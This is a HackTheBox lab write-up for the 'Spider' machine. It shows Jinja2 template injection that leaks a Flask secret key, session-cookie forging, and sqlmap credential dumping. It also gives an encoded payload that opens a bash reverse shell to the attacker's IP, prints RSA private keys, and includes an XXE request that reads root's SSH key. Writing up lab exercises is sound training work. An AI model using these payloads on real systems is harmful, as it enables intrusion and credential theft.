# Spider - HackTheBox - Writeup
Linux, 40 Base Points, Hard

## Machine

![‏‏Spider.JPG](images/Spider.JPG)

### TL;DR;

To solve this machine, we begin by enumerating open services – finding the ports ```22``` and ```80```.

***User:*** Playing with the registration of the website and examining the cookie, Use [STTI Attack](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) on username field, Get ```SECRET_KEY``` and use it to sign a ```session ``` cookie, Using ```Flask-Unsign``` to create malicious cookies and discover SQL Injection Using ```sqlmap```, Getting Chiv's password from ```sqlmap``` then logging into the web portal, On the portal, we found a message with a link to another portal with submitting ticket option, From that, we can use [STTI-Server-Side-Template-Injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) to get a reverse shell.

***Root:*** Found local port ```8080``` with shopping portal, Using SSH tunnel to setup a port forward which allows us to hit [127.0.0.1:8080](127.0.0.1:8080) on the remote host, Using [XXE injection](https://portswigger.net/web-security/xxe) on ```login```/```logout``` fields to read files, Grabbing the SSH key and logging in as root.

![pwn.JPG](images/pwn.JPG)

## Spider Solution


### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Spider]
└──╼ $ nmap -p- -sC -sV -oA nmap/Spider 10.10.10.243
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-10 03:21 IDT
Nmap scan report for 10.10.10.243
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 28:f1:61:28:01:63:29:6d:c5:03:6d:a9:f0:b0:66:61 (RSA)
|   256 3a:15:8c:cc:66:f4:9d:cb:ed:8a:1f:f9:d7:ab:d1:cc (ECDSA)
|_  256 a6:d4:0c:8e:5b:aa:3f:93:74:d6:a8:08:c9:52:39:09 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://spider.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

By observing port 80 we get the following (We need to add ```spider.htb``` to ```/etc/hosts``` before):

![port80.JPG](images/port80.JPG)

Let's create a new user by clicking on [Register](http://spider.htb/register):

![register.JPG](images/register.JPG)

Next, We moved to login page with ```52e24c2a-30cc-4851-86f4-c39976d35be0``` GUID as username, Let's login and looks on our [user information](http://spider.htb/user):

![userinfo.JPG](images/userinfo.JPG)

We can see our username and our GUID.

Let's try to register again and use [STTI Attack](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) (A server-side template injection - STTI - occurs when an attacker can use native template syntax to inject a malicious payload into a template, which is then executed server-side) with the simply payload ```${{7*7}}``` on username field (Username cannot be longer than 10 characters):

![stti.JPG](images/stti.JPG)

Now, Let's look again on our [user information](http://spider.htb/user):

![stti49.JPG](images/stti49.JPG)

Great, We can use [STTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) attack.

Let's try another payload (We have user name length limit) to get the ```SECRET_KEY``` which is allowed us to sign Cookies ([https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)).

By using ```{{config}}``` we get the following:

![config.JPG](images/config.JPG)

Which is:
```json
<Config{
  'ENV': 'production',
  'DEBUG': False,
  'TESTING': False,
  'PROPAGATE_EXCEPTIONS': None,
  'PRESERVE_CONTEXT_ON_EXCEPTION': None,
  'SECRET_KEY': 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942',
  'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31),
  'USE_X_SENDFILE': False,
  'SERVER_NAME': None,
  'APPLICATION_ROOT': '/',
  'SESSION_COOKIE_NAME': 'session',
  'SESSION_COOKIE_DOMAIN': False,
  'SESSION_COOKIE_PATH': None,
  'SESSION_COOKIE_HTTPONLY': True,
  'SESSION_COOKIE_SECURE': False,
  'SESSION_COOKIE_SAMESITE': None,
  'SESSION_REFRESH_EACH_REQUEST': True,
  'MAX_CONTENT_LENGTH': None,
  'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0,
  43200),
  'TRAP_BAD_REQUEST_ERRORS': None,
  'TRAP_HTTP_EXCEPTIONS': False,
  'EXPLAIN_TEMPLATE_LOADING': False,
  'PREFERRED_URL_SCHEME': 'http',
  'JSON_AS_ASCII': True,
  'JSON_SORT_KEYS': True,
  'JSONIFY_PRETTYPRINT_REGULAR': False,
  'JSONIFY_MIMETYPE': 'application/json',
  'TEMPLATES_AUTO_RELOAD': None,
  'MAX_COOKIE_SIZE': 4093,
  'RATELIMIT_ENABLED': True,
  'RATELIMIT_DEFAULTS_PER_METHOD': False,
  'RATELIMIT_SWALLOW_ERRORS': False,
  'RATELIMIT_HEADERS_ENABLED': False,
  'RATELIMIT_STORAGE_URL': 'memory://',
  'RATELIMIT_STRATEGY': 'fixed-window',
  'RATELIMIT_HEADER_RESET': 'X-RateLimit-Reset',
  'RATELIMIT_HEADER_REMAINING': 'X-RateLimit-Remaining',
  'RATELIMIT_HEADER_LIMIT': 'X-RateLimit-Limit',
  'RATELIMIT_HEADER_RETRY_AFTER': 'Retry-After',
  'UPLOAD_FOLDER': 'static/uploads'
}>
```

A secret key, As we have the secret key, We can sign/unsign (decode) the ```session``` cookie.

To do so, We can use [flask-unsign](https://pypi.org/project/flask-unsign/).

First, Let's simply decode the current ```session```:
```console
┌─[evyatar@parrot]─[/hackthebox/Spider]
└──╼ $ flask-unsign --decode --cookie eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6IjBkZDlmYTJiLTRmOTYtNGMxZi1hMWYwLTk1MTBkMmUzNDNjOSJ9.YTKlwQ.-D2GHHpgaNRYCWE6noLmC0Vu8YA
{'cart_items': [], 'uuid': '0dd9fa2b-4f96-4c1f-a1f0-9510d2e343c9'}
```

Now, Let's sign a new ```session``` cookie:
```console
┌─[evyatar@parrot]─[/hackthebox/Spider]
└──╼ $ flask-unsign --sign --cookie "{'cart_items': [], 'uuid': '0dd9fa2b-4f96-4c1f-a1f0-9510d2e343c9'}" --secret 'Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942'
eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6IjBkZDlmYTJiLTRmOTYtNGMxZi1hMWYwLTk1MTBkMmUzNDNjOSJ9.YTO-0g.dHo0F6JzZ7v1ppE6JJBxZU31OGI
```

Now, we can try to use ```sqlmap``` against the ```session``` cookie using ```SECRET_KEY```.

```console
┌─[evyatar@parrot]─[/hackthebox/Spider]
└──╼ $ sqlmap http://spider.htb --eval "from flask_unsign import session as s; session=s.sign({'uuid':session}, secret='Sup3rUnpredictableK3yPleas3Leav3mdanfe12332942')" --cookie="session=*" --delay 1 --dump
...
[23:16:16] [WARNING] table 'support' in database 'shop' appears to be empty
Database: shop
Table: support
[0 entries]
+------------+---------+---------+-------------+
| support_id | contact | message | timestamp   |
+------------+---------+---------+-------------+
+------------+---------+---------+-------------+

...

Database: shop
Table: items
[6 entries]
+----+-------------+-------+---------------------------------------------------+-------------------------------------------------------------------------+
| id | name        | price | image_path                                        | description                                                             |
+----+-------------+-------+---------------------------------------------------+-------------------------------------------------------------------------+
| 1  | Chair       | 1337  | stefan-chair-brown-black__0727320_PE735593_S5.JPG | This is a beautiful chair, finest quality, previously owned by Mitnick. |
| 2  | Black Chair | 1337  | martin-chair-black-black__0729761_PE737128_S5.JPG | This is the same as the other one but in black.                         |
| 3  | Chair       | 1337  | stefan-chair-brown-black__0727320_PE735593_S5.JPG | This is a beautiful chair, finest quality, previously owned by Mitnick. |
| 4  | Black Chair | 1337  | martin-chair-black-black__0729761_PE737128_S5.JPG | This is the same as the other one but in black.                         |
| 5  | Chair       | 1337  | stefan-chair-brown-black__0727320_PE735593_S5.JPG | This is a beautiful chair, finest quality, previously owned by Mitnick. |
| 6  | Black Chair | 1337  | martin-chair-black-black__0729761_PE737128_S5.JPG | This is the same as the other one but in black.                         |
+----+-------------+-------+---------------------------------------------------+-------------------------------------------------------------------------+

...
Database: shop
Table: users
[2 entries]
+----+--------------------------------------+--------+-----------------+
| id | uuid                                 | name   | password        |
+----+--------------------------------------+--------+-----------------+
| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv   | ch1VW4sHERE7331 |
| 2  | 73436507-0833-4d66-8a50-3429ba92811b | evevev | evevev          |
+----+--------------------------------------+--------+-----------------+

```

As we can see, we found credentials ```129f60ea-30cf-4065-afb9-6be45ad38b73:ch1VW4sHERE7331``` on ```users``` table, Let's try them:

![chiv.JPG](images/chiv.JPG)

By clicking on [Messages](http://spider.htb/view?check=messages) we can see:

![messages.JPG](images/messages.JPG)

Let's browse to [http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal](/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal):

![portal.JPG](images/portal.JPG)

Let's use the following payload ([STTI-Server-Side-Template-Injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)):
```node
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC85MDAxIDA+JjEK | base64 -d | bash")["read"]() %} a {% endwith %}
```

Where ```YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC85MDAxIDA+JjEK``` is:
```bash
bash -i >& /dev/tcp/10.10.14.14/9001 0>&1
```

Listern to port 9001 using ```netcat```:
```console
┌─[evyatar@parrot]─[/hackthebox/Spider]
└──╼ $ nc -lvp 9001
listening on [any] 9001 ..
```

Send the payload:
![payload.JPG](images/payload.JPG)


And we get a shell:
```console
┌─[evyatar@parrot]─[/hackthebox/Spider]
└──╼ $ nc -lvp 9001
listening on [any] 9001 .. connect to [10.10.14.14] from spider.htb [10.10.10.243] 45658
bash: cannot set terminal process group (1625): Inappropriate ioctl for device
bash: no job control in this shell
chiv@spider:/var/www/webapp$ cat /home/chiv/user.txt
cat /home/chiv/user.txt
89d904684345ed424cc7048cc13d635f
```

And we get the user flag ```89d904684345ed424cc7048cc13d635f```.

Let's use ```SSH``` private key of ```chiv``` to login:
```console
chiv@spider:~/.ssh$ pwd
pwd
/home/chiv/.ssh
chiv@spider:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV
gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS
U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9
MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7
BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2
VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu
6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs
hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl
Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc
XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq
54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy
f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62
nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL
j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO
JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW
K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv
hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ
mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8
gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb
0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2
nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W
CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG
rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO
TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6
IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==
-----END RSA PRIVATE KEY-----
``

```console
┌─[evyatar@parrot]─[/hackthebox/Spider]
└──╼ $ ssh -i id_rsa chiv@spider.htb
load pubkey "id_rsa": invalid format
Last login: Fri May 21 15:02:03 2021 from 10.10.14.7
chiv@spider:~$ 
```

### Root

By running ```netstat -ant``` we can see the following output:
```console
chiv@spider:~$ netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      1 10.10.10.243:51690      1.1.1.1:53              SYN_SENT   
tcp        0      0 10.10.10.243:45658      10.10.16.4:9001         ESTABLISHED
tcp        0      0 127.0.0.1:3306          127.0.0.1:55436         ESTABLISHED
tcp        0      0 127.0.0.1:55436         127.0.0.1:3306          ESTABLISHED
tcp        0    208 10.10.10.243:22         10.10.16.4:49518        ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN   
```

Let's create ```SSH``` tunnel to observe on port 8080:
```console
┌─[evyatar@parrot]─[/hackthebox/Spider]
└──╼ $ ssh -N -L 8081:127.0.0.1:8080 -i id_rsa chiv@spider.htb
load pubkey "id_rsa": invalid format

```

Browse to [http://localhost:8081](http://localhost:8081):

![port8081.JPG](images/port8081.JPG)

If we are trying to login as ```admin``` we get the following web page:

![admin.JPG](images/admin.JPG)

None of the links are working here except the ```logout```.

When we are clicking on ```logout``` we send the following request:
```HTTP
GET /logout HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://localhost:8081/site
Cookie: session=.eJxNjEFvgyAARv_KwnkH7WqTmexiAG03cKCActPRBC1as5HU2fS_z16aHb-8770rcPPgQHwFTy2IgUAUGzSX7HSQXPlRDqE6KvLbZrprBN6W6ZQYEUJWcSIh_xDIvpthv4jCw5WPhaBJjqeM94m-8_vWgYNMmQML0FZjm7cp9VTZTobiW0lTmBRXFFpCQr1Tbu1JVxE1M715Hf_7PLOXekFRs_ZJlXRNz18EItFXSuZc2YYv-FIP56B4_M1GnUxKsBMUecYWF9X9PiI4GT_L4A3cnsF07kb_A-Lg9gfxF1a8.YTPkVw.rUUUKpMfvvznY1m_0cnWI_fhrA0
Upgrade-Insecure-Requests: 1

```

Like before, Let's decode the cookie ```.eJxNjEFvgyAARv_KwnkH7WqTmexiAG03cKCActPRBC1as5HU2fS_z16aHb-8770rcPPgQHwFTy2IgUAUGzSX7HSQXPlRDqE6KvLbZrprBN6W6ZQYEUJWcSIh_xDIvpthv4jCw5WPhaBJjqeM94m-8_vWgYNMmQML0FZjm7cp9VTZTobiW0lTmBRXFFpCQr1Tbu1JVxE1M715Hf_7PLOXekFRs_ZJlXRNz18EItFXSuZc2YYv-FIP56B4_M1GnUxKsBMUecYWF9X9PiI4GT_L4A3cnsF07kb_A-Lg9gfxF1a8.YTPkVw.rUUUKpMfvvznY1m_0cnWI_fhrA0``` using ```flask-unsign```:
```console
┌─[evyatar@parrot]─[/hackthebox/Spider]
└──╼ $ flask-unsign --decode --cookie .eJxNjEFvgyAARv_KwnkH7WqTmexiAG03cKCActPRBC1as5HU2fS_z16aHb-8770rcPPgQHwFTy2IgUAUGzSX7HSQXPlRDqE6KvLbZrprBN6W6ZQYEUJWcSIh_xDIvpthv4jCw5WPhaBJjqeM94m-8_vWgYNMmQML0FZjm7cp9VTZTobiW0lTmBRXFFpCQr1Tbu1JVxE1M715Hf_7PLOXekFRs_ZJlXRNz18EItFXSuZc2YYv-FIP56B4_M1GnUxKsBMUecYWF9X9PiI4GT_L4A3cnsF07kb_A-Lg9gfxF1a8.YTPkVw.rUUUKpMfvvznY1m_0cnWI_fhrA0
{'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+YWRtaW48L3VzZXJuYW1lPgogICAgICAgIDxpc19hZG1pbj4wPC9pc19hZG1pbj4KICAgIDwvZGF0YT4KPC9yb290Pg==', 'points': 0}
```

We can see the Base64 on ```lxml```, Let's decode it:
```console
┌─[evyatar@parrot]─[/hackthebox/Spider]
└──╼ $ echo -n PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+YWRtaW48L3VzZXJuYW1lPgogICAgICAgIDxpc19hZG1pbj4wPC9pc19hZG1pbj4KICAgIDwvZGF0YT4KPC9yb290Pg== | base64 -d
<!-- API Version 1.0.0 -->
<root>
    <data>
        <username>admin</username>
        <is_admin>0</is_admin>
    </data>
</root>
```

We can see the XML contains our user name ```admin```.

Because It's XML, Let's try to use [XXE injection](https://portswigger.net/web-security/xxe).

Let's observe the ```/login``` request:
```HTTP
POST /login HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://localhost:8081
DNT: 1
Connection: close
Referer: http://localhost:8081/login
Cookie: session=eyJwb2ludHMiOjB9.YTPmnw.ZlJg3BNuGJGeofW762whgAARous
Upgrade-Insecure-Requests: 1

username=admin&version=1.0.0
```

We can see the version ```1.0.0``` which is the same as ```<!-- API Version 1.0.0 -->```.

By using ```XXE``` on ```version``` parameter as follow:
```HTTP
POST /login HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://localhost:8081
DNT: 1
Connection: close
Referer: http://localhost:8081/login
Cookie: session=eyJwb2ludHMiOjB9.YTPzIA.zxusVZ6FrgN76eODaI16pIusRJQ
Upgrade-Insecure-Requests: 1

username=%26test%3B&version=1.0.0--><!DOCTYPE+foo+[<!ENTITY+test+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```

We send ```username``` as ```&test;``` which point to XXE value of ```/root/.ssh/id_rsa```.

By sending it we get the ```root``` private key:

![xxeidrsa.JPG](images/xxeidrsa.JPG)

Which is:
```console
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAl/dn2XpJQuIw49CVNdAgdeO5WZ47tZDYZ+7tXD8Q5tfqmyxq
gsgQskHffuzjq8v/q4aBfm6lQSn47G8foq0gQ1DvuZkWFAATvTjliXuE7gLcItPt
iFtbg7RQV/xaTwAmdRfRLb7x63TG6mZDRkvFvGfihWqAnkuJNqoVJclgIXLuwUvk
4d3/Vo/MdEUb02ha7Rw9oHSYKR4pIgv4mDwxGGL+fwo6hFNCZ+YK96wMlJc3vo5Z
EgkdKXy3RnLKvtxjpIlfmAZGu0T+RX1GlmoPDqoDWRbWU+wdbES35vqxH0uM5WUh
vPt5ZDGiKID4Tft57udHxPiSD6YBhLT5ooHfFQIDAQABAoIBAFxB9Acg6Vc0kO/N
krhfyUUo4j7ZBHDfJbI7aFinZPBwRtq75VHOeexud2vMDxAeQfJ1Lyp9q8/a1mdb
sz4EkuCrQ05O9QthXJp0700+8t24WMLAHKW6qN1VW61+46iwc6iEtBZspNwIQjbN
rKwBlmMiQnAyzzDKtNu9+Ca/kZ/cAjLpz3m1NW7X//rcDL8kBGs8RfuHqz/R4R7e
HtCvxuXOFnyo/I+A3j1dPHoc5UH56g1W82NwTCbtCfMfeUsUOByLcg3yEypClO/M
s7pWQ1e4m27/NmU7R/cslc03YFQxow+CIbdd59dBKTZKErdiMd49WiZSxizL7Rdt
WBTACsUCgYEAyU9azupb71YnGQVLpdTOzoTD6ReZlbDGeqz4BD5xzbkDj7MOT5Dy
R335NRBf7EJC0ODXNVSY+4vEXqMTx9eTxpMtsP6u0WvIYwy9C7K/wCz+WXNV0zc0
kcSQH/Yfkd2jADkMxHXkz9THXCChOfEt7IUmNSM2VBKb1xBMkuLXQbMCgYEAwUBS
FhRNrIB3os7qYayE+XrGVdx/KXcKva6zn20YktWYlH2HLfXcFQQdr30cPxxBSriS
BAKYcdFXSUQDPJ1/qE21OvDLmJFu4Xs7ZdGG8o5v8JmF6TLTwi0Vi45g38DJagEl
w42zV3vV7bsAhQsMvd3igLEoDFt34jO9nQv9KBcCgYEAk8eLVAY7AxFtljKK++ui
/Xv9DWnjtz2UFo5Pa14j0O+Wq7C4OrSfBth1Tvz8TcW+ovPLSD0YKODLgOWaKcQZ
mVaF3j64OsgyzHOXe7T2iq788NF4GZuXHcL8Qlo9hqj7dbhrpPUeyWrcBsd1U8G3
AsAj8jItOb6HZHN0owefGX0CgYAICQmgu2VjZ9ARp/Lc7tR0nyNCDLII4ldC/dGg
LmQYLuNyQSnuwktNYGdvlY8oHJ+mYLhJjGYUTXUIqdhMm+vj7p87fSmqBVoL7BjT
Kfwnd761zVxhDuj5KPC9ZcUnaJe3XabZU7oCSDbj9KOX5Ja6ClDRswwMP31jnW0j
64yyLwKBgBkRFxxuGkB9IMmcN19zMWA6akE0/jD6c/51IRx9lyeOmWFPqitNenWK
teYjUjFTLgoi8MSTPAVufpdQV4128HuMbMLVpHYOVWKH/noFetpTE2uFStsNrMD8
vEgG/fMJ9XmHVsPePviZBfrnszhP77sgCXX8Grhx9GlVMUdxeo+j
-----END RSA PRIVATE KEY-----
```

Let's use it to login as root:
```console
┌─[evyatar@parrot]─[/hackthebox/Spider]
└──╼ $ ssh -i root_id_rsa root@spider.htb
load pubkey "root_id_rsa": invalid format
Last login: Fri Jul 23 14:11:40 2021
root@spider:~# id && hostname && whoami && cat root.txt
uid=0(root) gid=0(root) groups=0(root)
spider
root
a46908bb92e1959abecd66bb403e9033
root@spider:~#
```

And we get the root flag ```a46908bb92e1959abecd66bb403e9033```.